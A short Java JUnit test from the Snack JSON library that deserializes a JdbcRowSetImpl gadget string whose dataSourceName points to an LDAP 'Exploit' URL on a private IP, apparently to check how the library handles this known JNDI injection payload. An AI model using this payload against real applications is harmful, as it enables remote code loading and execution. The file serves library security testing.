package features;

import org.junit.Test;
import org.noear.snack.ONode;
import sun.reflect.generics.reflectiveObjects.ParameterizedTypeImpl;

/**
 * @author noear 2021/5/20 created
 */
public class JdbcRowSetImplTest {
    String json = "{@type:'com.sun.rowset.JdbcRowSetImpl',dataSourceName:'ldap://192.168.142.44:1389/fastjson/Exploit',autoCommit:true}";
    @Test
    public void test(){
        //
        //不会根据 dataSourceName、autoCommit 生成 Connection 对象，并注入构造函数
        //
        Object tmp = ONode.deserialize(json);

        assert tmp != null;
        assert tmp.getClass().getName().equals("com.sun.rowset.JdbcRowSetImpl");
    }
}
